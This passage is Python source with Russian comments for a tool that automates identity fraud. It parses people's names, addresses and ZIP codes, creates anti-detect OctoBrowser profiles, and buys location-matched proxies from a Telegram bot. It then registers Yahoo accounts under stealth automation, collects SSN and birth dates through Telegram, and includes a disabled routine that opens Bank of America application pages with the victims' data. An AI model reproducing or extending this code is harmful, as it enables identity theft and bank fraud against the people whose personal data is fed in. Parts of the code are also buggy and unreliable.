            zip_match = re.search(r'\b\d{5}(?:-\d{4})?\b', zip_line)
            if zip_match:
                zip_code = zip_match.group().split('-')[0]  # берем только первую часть ZIP кода
                print(f"✓ Найден ZIP-код: {zip_code}")
                return zip_code
        
        # Ищем строку с адресом (обычно вторая или третья строка)
        if len(data_lines) > 1:
            for i in range(1, min(5, len(data_lines))):
                address_line = data_lines[i]
                if re.search(r'адрес|улица|street|avenue|ave|st\b|rd\b|way|lane|ln\b|dr\b|blvd', address_line, re.IGNORECASE):
                    print(f"Найдена адресная строка: {address_line}")
                    zip_match = re.search(r'\b\d{5}(?:-\d{4})?\b', address_line)
                    if zip_match:
                        zip_code = zip_match.group().split('-')[0]
                        print(f"✓ Найден ZIP-код в адресе: {zip_code}")
                        return zip_code
        
        # Ищем строку с городом/штатом/ZIP в любой строке
        for i, line in enumerate(data_lines):
            # Ищем шаблон "Город, Штат ZIP"
            city_state_zip_match = re.search(r'([A-Za-z\s\'\.\-]+),\s*([A-Z]{2})\s+(\d{5}(?:-\d{4})?)', line)
            if city_state_zip_match:
                city = city_state_zip_match.group(1).strip()
                state = city_state_zip_match.group(2).strip()
                zip_code = city_state_zip_match.group(3).split('-')[0]
                print(f"✓ Найден ZIP-код {zip_code} для города {city}, штат {state}")
                return zip_code
                
            # Проверяем ключевые слова города/штата
            if re.search(r'город|city|штат|state|county', line, re.IGNORECASE):
                print(f"Найдена строка с упоминанием города/штата: {line}")
                zip_match = re.search(r'\b\d{5}(?:-\d{4})?\b', line)
                if zip_match:
                    zip_code = zip_match.group().split('-')[0]
                    print(f"✓ Найден ZIP-код в строке с городом/штатом: {zip_code}")
                    return zip_code
        
        # Если не нашли в специальных строках, ищем во всех строках данных - любые 5 цифр подряд
        print("ZIP-код не найден в специальных строках, ищем во всех данных...")
        for i, line in enumerate(data_lines):
            zip_match = re.search(r'\b\d{5}(?:-\d{4})?\b', line)
            if zip_match:
                zip_code = zip_match.group().split('-')[0]
                print(f"✓ Найден ZIP-код в строке {i+1}: {zip_code}")
                return zip_code
        
        print("❌ ZIP-код не найден ни в одной строке данных")
        return None
            
    except Exception as e:
        print(f"❌ Ошибка при извлечении ZIP-кода: {e}")
        import traceback
        traceback.print_exc()
        return None


def format_profile_name(full_name):
    """
    Форматирует имя профиля в формате 'NR BOA PERS AA',
    где NR - инициалы имени и фамилии.
    """
    if not full_name or not full_name.strip():
        return "UNKNOWN BOA PERS AA"
        
    words = full_name.split()
    if len(words) >= 2:
        initials = words[0][0].upper() + words[1][0].upper()
    elif len(words) == 1:
        initials = words[0][0].upper()
    else:
        initials = 'UNKNOWN'
    
    return f"{initials} BOA PERS AA"


async def create_octobrowser_profile(profile_name, client=None, lines=None, mock=False):
    global last_created_profile_id
    try:
        # Если profile_name не передан, но есть lines - формируем имя из lines
        if profile_name is None and lines:
            profile_name = format_profile_name(lines[0])
        # Если profile_name передан как строка с данными, а не как готовое имя профиля
        elif lines is None and profile_name and "\n" in profile_name:
            lines = profile_name.strip().split("\n")
            profile_name = format_profile_name(lines[0])
        # Если передан profile_name и lines отдельно
        elif lines and profile_name and not profile_name.endswith("BOA PERS AA"):
            profile_name = format_profile_name(lines[0])
        
        # Если после всех проверок profile_name всё ещё None, используем запасной вариант
        if profile_name is None:
            profile_name = "UNKNOWN BOA PERS AA"
            print("⚠️ Не удалось сформировать имя профиля, используется запасное имя.")
            
        print(f"🔹 Создаю профиль с именем: {profile_name}")
        
        # Если это тестовый режим, просто выводим имя профиля и выходим
        if mock:
            print(f"[MOCK] Профиль с именем '{profile_name}' был бы создан (тестовый режим)")
            return "mock-profile-id"
        
        # Проверяем доступ к API OctoBrowser
        cloud_access, local_access = await octo.check_api_access()
        
        if not cloud_access:
            print("❌ Нет доступа к облачному API OctoBrowser. Проверьте подключение и токен API.")
            print("❌ Дальнейшая работа невозможна.")
            return
            
        if not local_access:
            print("❌ Нет доступа к локальному API OctoBrowser.")
            print("❌ Дальнейшая работа невозможна.")
            return
        
        # Получаем список существующих профилей
        existing_profiles = await octo.get_profiles()
        
        # Проверяем, есть ли уже профиль с таким именем
        for profile in existing_profiles:
            if profile.get("title", profile.get("name", "")) == profile_name:
                print(f"✓ Найден существующий профиль с именем '{profile_name}', id: {profile.get('uuid')}")
                last_created_profile_id = profile.get("uuid")
                
                # Отправляем запрос на покупку прокси
                await send_start_to_proxy_bot_async(client, lines)
                
                return last_created_profile_id
        
        # Создаем новый профиль через облачный API
        profile_id = await octo.create_profile(profile_name, "win")
        
        if profile_id:
            # Сохраняем ID профиля в глобальную переменную
            last_created_profile_id = profile_id
            print_success(f"✓ Профиль OctoBrowser создан: {profile_id}")
            
            # Отправляем запрос на покупку прокси
            await send_start_to_proxy_bot_async(client, lines)
            
            return profile_id
        else:
            print_error("❌ Не удалось создать профиль OctoBrowser.")
            return None
            
    except Exception as e:
        print_error(f"❌ Ошибка при создании профиля OctoBrowser: {e}")
        import traceback
        traceback.print_exc()
        return None
    
    # Завершаем функцию, если до сих пор не вернули значение
    return None


async def wait_and_click_buy_button(client, bot_id, lines=None):
    """Ждет сообщение с 💎 и нажимает кнопку Buy (2-я кнопка) - отключена покупка"""
    try:
        print("Жду сообщение с 💎 и проверяю настройки покупки прокси...")
        import asyncio
        
        # Проверяем настройки покупки прокси
        try:
            with open('settings.json', 'r', encoding='utf-8') as f:
                settings = json.load(f)
                enable_proxy_purchase = settings.get("proxy_settings", {}).get("enable_proxy_purchase", False)
                print_info(f"Настройка enable_proxy_purchase: {enable_proxy_purchase}")
        except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
            print_warning(f"⚠️ Ошибка при чтении settings.json: {e}")
            enable_proxy_purchase = False
        
        # Если покупка отключена в настройках
        if not enable_proxy_purchase:
            print_warning("⚠️ Автоматическая покупка прокси отключена в настройках")
            print_info("Запускаем только Yahoo без покупки прокси:")
            print_info("1. Регистрация Yahoo")
            print_info("2. Получение SSN/DOB из личного сообщения Telegram")
            
            # Получаем ID профиля из параметра
            profile_id = lines[0] if lines and len(lines) > 0 else None
            if not profile_id:
                # Если ID не предоставлен, спросим пользователя
                profile_id = input("Введите ID профиля OctoBrowser (или оставьте пустым для создания нового): ").strip()
            
            if profile_id:
                print_info(f"✓ Используем существующий профиль: {profile_id}")
                print_info("❗ Прокси должен быть настроен вручную в профиле OctoBrowser")
                print_info("Нажмите Enter для запуска автоматизации Yahoo...")
                input()
                return {"type": "yahoo_sequence", "profile_id": profile_id, "skip_proxy": True, "proxy_data": None}
            else:
                print_info("Будет создан новый профиль OctoBrowser")
                profile_name = input("Введите имя для профиля: ").strip() or "Yahoo Profile"
                print_info("❗ После создания профиля необходимо будет настроить прокси вручную")
                print_info("Нажмите Enter для запуска создания профиля и автоматизации Yahoo...")
                input()
                return {"type": "yahoo_sequence", "profile_id": None, "profile_name": profile_name, "skip_proxy": True, "proxy_data": None}
        
        # Если покупка включена, продолжаем стандартный процесс
        print("✓ Автоматическая покупка прокси включена")
        for attempt in range(10):  # 10 попыток по 0.05 секунды
            await asyncio.sleep(0.05)
            print(f"Попытка {attempt + 1}/10...")
            
            # Получаем последние сообщения от бота
            async for message in client.iter_messages(bot_id, limit=5):
                print(f"Проверяю сообщение: {message.text[:50]}...")
                # Проверяем два возможных формата сообщения:
                # 1. Сообщение с 💎 и кнопками
                # 2. Сообщение с информацией о прокси вида "**PROXY ID** `номер` **REAL IP** `IP-адрес`" и кнопками
                has_proxy_info = message.text and ("**PROXY ID**" in message.text or "REAL IP" in message.text)
                has_diamond = message.text and message.text.startswith('💎')
                
                if (has_diamond or has_proxy_info) and message.buttons:
                    if has_diamond:
                        print(f"✓ Найдено сообщение с 💎: {message.text[:100]}...")
                    elif has_proxy_info:
                        print(f"✓ Найдено сообщение с информацией о прокси: {message.text[:100]}...")
                    
                    print(f"Найдены кнопки в сообщении:")
                    
                    # Собираем все кнопки в один список
                    all_buttons = []
                    for row_index, row in enumerate(message.buttons):
                        for col_index, button in enumerate(row):
                            all_buttons.append(button)
                            print(f"  Кнопка {len(all_buttons)}: '{button.text}'")
                    
                    # Проверяем кнопки - ищем кнопку "Buy" или берем вторую кнопку
                    target_button = None
                    
                    # Сначала ищем кнопку с текстом "Buy", "Купить" или похожим
                    for button in all_buttons:
                        if button.text.lower() in ["buy", "купить", "purchase", "приобрести", "get", "pay"]:
                            target_button = button
                            print(f"✓ Найдена кнопка покупки: {button.text}")
                            break
                    
                    # Если кнопка Buy не найдена, но есть хотя бы 2 кнопки, берем вторую
                    if target_button is None and len(all_buttons) >= 2:
                        target_button = all_buttons[1]  # 2-я кнопка (индекс 1)
                        print(f"✓ Кнопка Buy не найдена, использую 2-ю кнопку: {target_button.text}")
                    
                    if target_button:
                        print(f"Нажимаем кнопку {target_button.text}...")
                        await message.click(data=target_button.data)
                        print(f"✓ Кнопка '{target_button.text}' нажата")
                        
                        # Минимальная пауза для ответа бота
                        await asyncio.sleep(0.1)
                        
                        # Ждем сообщение "Обработка запроса" и результат
                        result = await wait_for_processing_and_result(client, bot_id, lines)
                        if result == "continue":
                            # Продолжаем цикл с новыми данными
                            continue
                        elif result == "finish":
                            # Завершаем работу
                            return
                        else:
                            # Обычное завершение
                            return
                    else:
                        print(f"❌ Недостаточно кнопок или не найдена кнопка покупки")
                        print("Доступные кнопки:")
                        for i, button in enumerate(all_buttons):
                            print(f"  {i+1}: {button.text}")
                else:
                    if message.text and "**PROXY ID**" in message.text and "REAL IP" in message.text:
                        print(f"⚠️ Найдена информация о прокси, но нет кнопок: {message.text[:100]}...")
                        # Если есть информация о прокси, сохраняем ее и пробуем продолжить
                        print("✅ Обнаружены данные прокси, пробую продолжить без кнопок")
                        proxy_data = extract_proxy_data(message.text)
                        if proxy_data:
                            print_success(f"✓ Данные прокси извлечены автоматически: {proxy_data}")
                            result = await configure_octobrowser_profile_with_proxy(proxy_data, lines)
                            return "finish"
                    else:
                        print("Сообщение без информации о прокси или без кнопок")
        
        print("❌ Сообщение с данными прокси или кнопкой Buy не найдено в ответе бота после всех попыток")
        print("⚠️ Проблема с получением прокси или с поиском кнопки Buy в сообщении 'Выберите радиус поиска'")
        
        # Проверяем все сообщения еще раз на наличие **PROXY ID**
        print("🔍 Выполняю дополнительную проверку всех сообщений на наличие данных прокси...")
        async for message in client.iter_messages(bot_id, limit=20):
            if message.text and "**PROXY ID**" in message.text and "REAL IP" in message.text:
                print(f"✓ Обнаружено сообщение с прокси при дополнительной проверке: {message.text[:100]}...")
                proxy_data = extract_proxy_data(message.text)
                if proxy_data:
                    print_success(f"✓ Данные прокси извлечены автоматически: {proxy_data}")
                    result = await configure_octobrowser_profile_with_proxy(proxy_data, lines)
                    return "finish"
        
    except Exception as e:
        print(f"❌ Ошибка при поиске кнопки Buy: {e}")
        import traceback
        traceback.print_exc()


async def wait_for_processing_and_result(client, bot_id, lines=None):
    """Ждет сообщение 'Обработка запроса' и результат с данными прокси"""
    try:
        print("Жду сообщение 'Обработка запроса'...")
        # Ждем до 0.5 секунд для получения ответа от бота
        import asyncio
        for attempt in range(10):  # 10 попыток по 0.05 секунды
            await asyncio.sleep(0.05)
            print(f"Попытка {attempt + 1}/10...")
            
            # Получаем последние сообщения от бота
            async for message in client.iter_messages(bot_id, limit=5):
                print(f"Проверяю сообщение: {message.text[:50]}...")
                if message.text and "обработка запроса" in message.text.lower():
                    print(f"✓ Найдено сообщение: {message.text[:100]}...")
                    print("Ждем результат...")
                    
                    # Ждем результат с данными прокси
                    result = await wait_for_proxy_data(client, bot_id, lines)
                    return result
                else:
                    print("Сообщение без 'Обработка запроса'")
        
        print("❌ Сообщение 'Обработка запроса' не найдено в ответе бота после всех попыток")
        
    except Exception as e:
        print(f"❌ Ошибка при ожидании обработки: {e}")
        import traceback
        traceback.print_exc()


async def wait_for_proxy_data(client, bot_id, lines=None):
    """Ждет сообщение с данными прокси и настраивает профиль"""
    try:
        print("Жду сообщение с данными прокси...")
        import asyncio
        for attempt in range(30):  # 30 попыток по 0.01 секунды
            await asyncio.sleep(0.01)
            print(f"Попытка {attempt + 1}/30...")
            
            # Получаем последние сообщения от бота
            async for message in client.iter_messages(bot_id, limit=20):
                print(f"Проверяю сообщение: {message.text[:50]}...")
                if message.text and "proxy id" in message.text.lower() and "real ip" in message.text.lower():
                    print(f"✓ Найдены данные прокси: {message.text[:200]}...")
                    
                    # Извлекаем данные прокси
                    proxy_data = extract_proxy_data(message.text)
                    if proxy_data:
                        print(f"✓ Данные прокси извлечены: {proxy_data}")
                        # Выводим сообщение с прокси и названием профиля
                        profile_id = get_last_created_profile_id()
                        print(f"\n==== ПРОКСИ ДЛЯ ПРОФИЛЯ ====")
                        print(f"Профиль: {profile_id}")
                        print(f"CONNECT DATA: {proxy_data['connect_data']}")
                        print(f"============================\n")
                        # Анимация ожидания изменения прокси
                        print("Ожидание изменения прокси (анимация)...", end="", flush=True)
                        for i in range(10):
                            print(".", end="", flush=True)
                            time.sleep(0.2)
                        print("\nОжидание изменения прокси завершено!")
                        print("\nНажмите Enter и профиль будет запущен...")
                        input()
                        # Настраиваем профиль OctoBrowser с прокси
                        result = await configure_octobrowser_profile_with_proxy(proxy_data, lines, skip_proxy=False)
                        return result
                    else:
                        print("❌ Не удалось извлечь данные прокси")
                        return
                else:
                    print("Сообщение без данных прокси")
        print("❌ Данные прокси не найдены в ответе бота после всех попыток")
    except Exception as e:
        print(f"❌ Ошибка при получении данных прокси: {e}")
        import traceback
        traceback.print_exc()


def extract_proxy_data(message_text):
    """Извлекает данные прокси из сообщения"""
    try:
        lines = message_text.split('\n')
        proxy_data = {}
        
        for line in lines:
            line = line.strip()
            if 'CONNECT DATA' in line and '`' in line:
                # Извлекаем CONNECT DATA
                connect_data = line.split('`')[1]
                print(f"✓ Найдена CONNECT DATA: {connect_data}")
                
                # Парсим CONNECT DATA в формате username:password@host:port
                if '@' in connect_data and ':' in connect_data:
                    auth_part, server_part = connect_data.split('@')
                    if ':' in auth_part and ':' in server_part:
                        username, password = auth_part.split(':')
                        host, port = server_part.split(':')
                        
                        # Дополнительная проверка на корректность данных
                        if username and password and host and port:
                            try:
                                port_int = int(port)
                                if port_int <= 0 or port_int > 65535:
                                    print(f"❌ Неверный порт: {port}")
                                    return None
                            except ValueError:
                                print(f"❌ Неверный формат порта: {port}")
                                return None
                        
                        proxy_data['username'] = username
                        proxy_data['password'] = password
                        proxy_data['host'] = host
                        proxy_data['port'] = port
                        proxy_data['connect_data'] = connect_data
                        
                        print(f"✓ Успешно извлечены данные из CONNECT DATA:")
                        print(f"  USERNAME: {username}")
                        print(f"  PASSWORD: {password}")
                        print(f"  HOST: {host}")
                        print(f"  PORT: {port}")
                        return proxy_data
                    else:
                        print(f"❌ Неправильный формат CONNECT DATA: {connect_data}")
                        return None
                else:
                    print(f"❌ Неправильный формат CONNECT DATA: {connect_data}")
                    return None
        
        print(f"❌ CONNECT DATA не найдена в сообщении")
        print(f"Исходный текст: {message_text}")
        return None
            
    except Exception as e:
        print(f"❌ Ошибка при извлечении данных прокси: {e}")
        return None


async def configure_octobrowser_profile_with_proxy(proxy_data, lines=None, skip_proxy=False):
    try:
        print("Настраиваю профиль OctoBrowser...")

        profile_id = get_last_created_profile_id()
        if not profile_id:
            print("❌ ID профиля не найден")
            return

        print(f"Профиль {profile_id} создан.")
        
        # Получаем информацию о профиле через API OctoBrowser
        profile_info = await octo.get_profile_info(profile_id)
        if profile_info:
            print(f"Информация о профиле: {profile_info.get('title')}")
        
        # Проверяем, нужно ли настраивать прокси
        if skip_proxy or not proxy_data:
            print_warning("⚠️ Настройка прокси пропущена (enable_proxy_purchase = false)")
            print_info("❗ Настройте прокси в OctoBrowser вручную, если необходимо")
            print_info("После настройки нажмите Enter для продолжения...")
            input()
        else:
            # Настраиваем прокси в профиле через API
            proxy_configured = await octo.configure_profile_proxy(profile_id, proxy_data)
        
        if proxy_configured:
            print("✓ Прокси успешно настроен в профиле")
        else:
            print("❌ Не удалось настроить прокси через API")
            print("Настройте прокси в OctoBrowser вручную.")
            print("После настройки нажмите Enter для продолжения...")
            input()
            
        print("✅ Прокси настроен, запускаю автоматизацию Yahoo для получения SSN/DOB...")
        
        # Парсим данные пользователя из full/all_registrations.json для автоматизации Yahoo
        parsed_data = parse_user_data_boa() # Функция все еще используется, но только для Yahoo
        
        # Проверка наличия файла с данными
        if not parsed_data:
            print_warning("⚠️ Файл full/all_registrations.json не найден или не содержит данных")
            print_info("ℹ️ Создаю базовые данные для теста")
            
            parsed_data = {
                "full_name": "Test User",
                "first_name": "Test",
                "last_name": "User",
                "address": "123 Main St",
                "city_state_zip": "New York, NY 10001", 
                "birth_date": "January 1990",
                "phone": "(555) 123-4567"
            }
        
        if parsed_data:
            print_info("📧 Запускаю автоматизацию Yahoo для получения SSN/DOB...")
            
            # Запускаем только Yahoo (Bank of America отключен)
            url = "https://login.yahoo.com/account/create"
            result = await octo.start_profile_with_stealth_playwright(profile_id, url)
            
            if result:
                # Формируем данные для регистрации Yahoo, проверяем наличие всех необходимых полей
                try:
                    user_data_text = ""
                
                    # Проверка и безопасное добавление каждого поля
                    if "full_name" in parsed_data and parsed_data["full_name"]:
                        user_data_text += parsed_data["full_name"] + "\n"
                    else:
                        print_warning("⚠️ Отсутствует поле full_name, использую значение по умолчанию")
                        user_data_text += "Test User\n"
                        
                    if "address" in parsed_data and parsed_data["address"]:
                        user_data_text += parsed_data["address"] + "\n"
                    else:
                        print_warning("⚠️ Отсутствует поле address, использую значение по умолчанию")
                        user_data_text += "123 Main St\n"
                        
                    if "city_state_zip" in parsed_data and parsed_data["city_state_zip"]:
                        user_data_text += parsed_data["city_state_zip"] + "\n"
                    else:
                        # Пробуем собрать city_state_zip из отдельных компонентов
                        city = parsed_data.get("city", "")
                        state = parsed_data.get("state", "")
                        zip_code = parsed_data.get("zip_code", "")
                        
                        if city and state and zip_code:
                            city_state_zip = f"{city}, {state} {zip_code}"
                            user_data_text += city_state_zip + "\n"
                            print_info(f"✓ Собрал city_state_zip из отдельных полей: {city_state_zip}")
                        else:
                            print_warning("⚠️ Отсутствует поле city_state_zip, использую значение по умолчанию")
                            user_data_text += "New York, NY 10001\n"
                        
                    if "birth_date" in parsed_data and parsed_data["birth_date"]:
                        user_data_text += parsed_data["birth_date"] + "\n"
                    else:
                        # Пробуем собрать birth_date из отдельных компонентов
                        birth_month = parsed_data.get("birth_month", "")
                        birth_year = parsed_data.get("birth_year", "")
                        
                        if birth_month and birth_year:
                            birth_date = f"{birth_month} {birth_year}"
                            user_data_text += birth_date + "\n"
                            print_info(f"✓ Собрал birth_date из отдельных полей: {birth_date}")
                        else:
                            print_warning("⚠️ Отсутствует поле birth_date, использую значение по умолчанию")
                            user_data_text += "January 1990\n"
                        
                    if "phone" in parsed_data and parsed_data["phone"]:
                        user_data_text += parsed_data["phone"]
                    else:
                        print_warning("⚠️ Отсутствует поле phone, использую значение по умолчанию")
                        user_data_text += "(555) 123-4567"
                        
                    print_info(f"✓ Подготовлены данные для Yahoo (5 строк):")
                    print_info(f"1. {user_data_text.split('\n')[0]}")
                    print_info(f"2. {user_data_text.split('\n')[1]}")
                    print_info(f"3. {user_data_text.split('\n')[2]}")
                    print_info(f"4. {user_data_text.split('\n')[3]}")
                    print_info(f"5. {user_data_text.split('\n')[4] if len(user_data_text.split('\n')) > 4 else '(не указан)'}")
                    
                    # Запускаем регистрацию Yahoo для получения SSN/DOB
                    print_info("📧 Запускаю регистрацию Yahoo для получения SSN/DOB...")
                    yahoo_result = await octo.automate_yahoo_registration(result["page"], user_data_text)
                    
                    if yahoo_result and yahoo_result.get("registration_success", False):
                        print_success("✓ Регистрация Yahoo успешна, получены SSN и DOB")
                        # Сохраняем полученные SSN и DOB
                        if yahoo_result.get("ssn") and yahoo_result.get("dob"):
                            print_success(f"📝 Получены данные: SSN={yahoo_result.get('ssn')}, DOB={yahoo_result.get('dob')}")
                    else:
                        print_error("❌ ❌ Автоматизация Yahoo не удалась")
                        return "continue"
                
                except Exception as e:
                    print_error(f"❌ Ошибка при подготовке данных для Yahoo: {e}")
                    import traceback
                    traceback.print_exc()
                    return "continue"
                
                # Закрываем браузер перед возвратом
                await result["browser"].close()
                await result["playwright"].stop()
            else:
                print_error("❌ Не удалось запустить профиль OctoBrowser")
        else:
            print_warning("⚠️ Не удалось распарсить данные для Bank of America")
            print("Для автоматизации Bank of America используйте соответствующий пункт меню.")
        
        input("Нажмите Enter для возврата в главное меню...")
        return
        
        # --- Автоматизация Yahoo после запуска профиля ОТКЛЮЧЕНА ---
        # Эта часть кода не будет выполняться
        # print("\nАвтоматический запуск профиля с переходом на Yahoo и заполнением формы...")
        url = "https://login.yahoo.com/account/create"
        result = await octo.start_profile_with_stealth_playwright(profile_id, url)
        if result and lines:
            # lines — это список строк с данными пользователя
            user_data = '\n'.join(lines)
            reg_result = await octo.automate_yahoo_registration(result["page"], user_data)
            
            # Проверяем результат регистрации
            if reg_result and reg_result.get("registration_success", False):
                print("✓ Регистрация Yahoo выполнена успешно!")
                
                # Запрашиваем ответ от Telegram
                print_info("Ожидаю ответ от Telegram с SSN и DOB...")
                telegram_response = input("📱 Вставьте ответ от Telegram (с SSN и DOB): ")
                
                if telegram_response.strip():
                    # Извлекаем SSN и DOB из ответа
                    ssn, dob = extract_ssn_and_dob_from_telegram_response(telegram_response)
                    
                    if ssn and dob:
                        # Сохраняем SSN и DOB в файл
                        email = reg_result.get("email", "")
                        password = reg_result.get("password", "")
                        
                        # Подготавливаем полные данные для сохранения
                        full_data = {
                            "registration_data": reg_result,
                            "user_data": user_data,
                            "telegram_response": telegram_response,
                            "ssn": ssn,
                            "dob": dob,
                            "profile_id": profile_id
                        }
                        
                        print_success("✓ SSN и DOB успешно получены!")
                        
                        # Сохраняем SSN и DOB в папку data/
                        update_user_data_with_ssn_dob(ssn, dob)
                        
                        # Парсим данные пользователя для Bank of America из full/all_registrations.json
                        parsed_data = parse_user_data_boa()
                        
                        if parsed_data:
                            print_info("🏦 Запускаю автоматизацию Bank of America в новой вкладке того же профиля...")
                            
                            # Открываем Bank of America в новой вкладке того же профиля
                            boa_result = await octo.open_bank_of_america_in_new_tab(result["browser"], parsed_data)
                            
                            if boa_result and boa_result.get("success", False):
                                print_success("✓ Автоматизация Bank of America завершена успешно!")
                                
                                # Спрашиваем пользователя, хочет ли он продолжить с новыми данными
                                print("\n" + "="*60)
                                print("🎯 Хотите продолжить с новыми данными?")
                                print("1. Да - ввести новые данные")
                                print("2. Нет - завершить работу")
                                print("="*60)
                                
                                continue_choice = input("Введите выбор (1 или 2): ").strip()
                                
                                if continue_choice == "1":
                                    print("\n🔄 Возвращаюсь к вводу данных...")
                                    # Закрываем браузер перед возвратом
                                    await result["browser"].close()
                                    await result["playwright"].stop()
                                    # Возвращаемся к вводу данных (цикл продолжится)
                                    return "continue"
                                else:
                                    print("\n🏁 Завершаю работу...")
                                    # Закрываем браузер перед возвратом
                                    await result["browser"].close()
                                    await result["playwright"].stop()
                                    return "finish"
                            else:
                                print_warning("⚠️ Автоматизация Bank of America не удалась")
                                error_msg = boa_result.get("error", "Неизвестная ошибка") if boa_result else "Неизвестная ошибка"
                                print_error(f"Ошибка: {error_msg}")
                                
                                # Закрываем браузер перед возвратом
                                await result["browser"].close()
                                await result["playwright"].stop()
                                return "continue"
                        else:
                            print_warning("⚠️ Не удалось распарсить данные для Bank of America")
                            
                            # Закрываем браузер перед возвратом
                            await result["browser"].close()
                            await result["playwright"].stop()
                            return "continue"
                    elif not ssn or not dob:
                        print_warning("Не удалось извлечь SSN и DOB из ответа Telegram")
                        
                        # Закрываем браузер перед возвратом
                        await result["browser"].close()
                        await result["playwright"].stop()
                        return "continue"
                    else:
                        print_warning("Ответ от Telegram не получен")
                        
                        # Закрываем браузер перед возвратом
                        await result["browser"].close()
                        await result["playwright"].stop()
                        return "continue"
                elif not reg_result or not reg_result.get("registration_success", False):
                    # Регистрация не удалась или пользователь выбрал "Нет, не удалось"
                    print_error("❌ Регистрация Yahoo не удалась")
                    print_info("Проверяю сообщение...")
                    
                    # Ищем сообщение с IP в группе
                    try:
                        # Проверяем наличие сообщения с IP в группе
                        import re
                        
                        # Определяем вспомогательную функцию для проверки сообщения
                        async def check_ip_message():
                            try:
                                from telethon import TelegramClient
                                import json
                                
                                # Загружаем настройки
                                with open('settings.json', 'r', encoding='utf-8') as f:
                                    settings = json.load(f)
                                
                                telegram_settings = settings.get('telegram_settings', {})
                                TELEGRAM_API_ID = telegram_settings.get('api_id')
                                TELEGRAM_API_HASH = telegram_settings.get('api_hash')
                                TELEGRAM_PHONE = telegram_settings.get('phone')
                                PASSWORD = telegram_settings.get('password')
                                TELEGRAM_GROUP_ID = telegram_settings.get('group_id')
                                
                                # Создаем клиент
                                client = TelegramClient('userbot_session', TELEGRAM_API_ID, TELEGRAM_API_HASH)
                                await client.start(phone=TELEGRAM_PHONE, password=PASSWORD)
                                
                                # Ищем сообщение с IP
                                found_message = None
                                async for message in client.iter_messages(TELEGRAM_GROUP_ID, limit=10):
                                    if message and message.text and "💎" in message.text and "IP" in message.text:
                                        print_info(f"✓ Найдено сообщение с 💎: {message.text[:100]}...")
                                        found_message = message
                                        break
                        
                                # Если нашли сообщение с IP
                                if found_message:
                                    # Проверяем наличие кнопок в сообщении
                                    if found_message.reply_markup:
                                        buttons = []
                                        for row in found_message.reply_markup.rows:
                                            for button in row.buttons:
                                                buttons.append(button)
                                        
                                        print_info("Найдены кнопки в сообщении:")
                                        for i, button in enumerate(buttons):
                                            print_info(f"  Кнопка {i+1}: '{button.text}'")
                                        
                                        # Ищем кнопку Buy
                                        buy_button = None
                                        for button in buttons:
                                            if "Buy" in button.text:
                                                buy_button = button
                                                print_info(f"✓ Найдена 2-я кнопка: {button.text}")
                                                break
                                        
                                        if buy_button:
                                            print_info("Нажимаем кнопку Buy...")
                                            await found_message.click(text=buy_button.text)
                                            print_success("✓ Кнопка Buy нажата")
                                
                                await client.disconnect()
                                return True
                            except Exception as e:
                                print_warning(f"Ошибка при проверке сообщения: {e}")
                                return False
                        
                        # Запускаем проверку сообщения
                        result_check = await check_ip_message()
                    except Exception as e:
                        print_warning(f"Ошибка при проверке сообщения: {e}")
                
                # Закрываем браузер перед возвратом
                if result and result.get("browser"):
                    await result["browser"].close()
                if result and result.get("playwright"):
                    await result["playwright"].stop()
                
                # Удаляем профиль
                try:
                    if profile_id:
                        await delete_octobrowser_profile(profile_id)
                        print_success("✓ Профиль удален")
                except Exception as e:
                    print_error(f"Ошибка при удалении профиля: {e}")
                
                return "continue"  # Возвращаемся к вводу данных
        else:
            print("❌ Не удалось запустить профиль или перейти на Yahoo")
            return "continue"  # Возвращаемся к вводу данных
    except Exception as e:
        print(f"❌ Ошибка при настройке прокси: {e}")
        import traceback
        traceback.print_exc()
        return "continue"  # Возвращаемся к вводу данных

# Функция запуска профиля OctoBrowser перенесена в модуль octo.py

# Функция automate_bank_of_america удалена, так как теперь используется 
# open_bank_of_america_in_new_tab из модуля octo.py

# Функция для автоматизации Bank of America - отключена
async def automate_bank_of_america_registration(page, user_data):
    """
    Открывает сайт Bank of America и вводит ZIP-код
    
    Args:
        page: Playwright page object
        user_data (dict): Данные пользователя
        
    Returns:
        dict: Результат автоматизации
    """
    try:
        print_info("Открываю сайт Bank of America...")
        
        # Ждем загрузки страницы
        await page.wait_for_load_state("networkidle")
        
        # Проверяем, что мы на правильной странице
        title = await page.title()
        print_info(f"Заголовок страницы: {title}")
        
        # Ищем поле для ввода ZIP-кода
        print_info("Ищу поле для ввода ZIP-кода...")
        
        zip_input_selectors = [
            "input[id='zipCodeModalInputField']",
            "input[name='zipCodeInput']",
            "input[data-sparta-input-format='zip']",
            "input[pattern='^\\d{5}$']",
            "input[aria-describedby*='zipCodeModalInputField']"
        ]
        
        zip_input = None
        for selector in zip_input_selectors:
            try:
                zip_input = await page.wait_for_selector(selector, timeout=5000)
                if zip_input:
                    print_success(f"✓ Найдено поле ZIP-кода: {selector}")
                    break
            except:
                continue
            
        if not zip_input:
            print_error("❌ ❌ Поле для ввода ZIP-кода не найдено")
            print_warning("⚠️ ⚠️ Автоматизация Bank of America не удалась")
            print_error(f"Ошибка: ZIP-код поле не найдено после запуска профиля. Проверьте, что открыт правильный сайт: {await page.url()}")
            return {"success": False, "error": "ZIP-код поле не найдено"}
        
        # Получаем ZIP-код из данных пользователя
        zip_code = user_data.get("zip_code", "")
        if not zip_code:
            print_error("❌ ZIP-код не найден в данных пользователя")
            return {"success": False, "error": "ZIP-код отсутствует в данных"}
        
        print_info(f"Ввожу ZIP-код: {zip_code}")
        
        # Очищаем поле и вводим ZIP-код
        await zip_input.fill("")
        await zip_input.type(zip_code, delay=100)
        print_success(f"✓ ZIP-код введен: {zip_code}")
        
        # Ждем 3 секунды перед нажатием Enter
        print_info("Жду 3 секунды перед нажатием Enter...")
        await page.wait_for_timeout(3000)
        
        # Нажимаем Enter в поле ZIP-кода
        print_info("Нажимаю Enter в поле ZIP-кода...")
        await zip_input.press("Enter")
        print_success("✓ Enter нажат в поле ZIP-кода")
        
        # Ждем загрузки после нажатия Enter
        await page.wait_for_load_state("networkidle")
        print_success("✓ ZIP-код обработан")
        
        # Проверяем, есть ли модальное окно выбора округа
        print_info("Проверяю наличие модального окна выбора округа...")
        
        try:
            # Ищем модальное окно округа
            county_modal = await page.wait_for_selector("#countySelectModal", timeout=3000)
            if county_modal:
                print_success("✓ Найдено модальное окно выбора округа")
                
                # Ищем селект округа
                county_select = await page.wait_for_selector("#countySelectModalSelect", timeout=2000)
                if county_select:
                    print_info("Выбираю первый доступный округ...")
                    
                    # Получаем все опции
                    options = await county_select.query_selector_all("option")
                    
                    if len(options) > 1:  # Если есть опции кроме "Select"
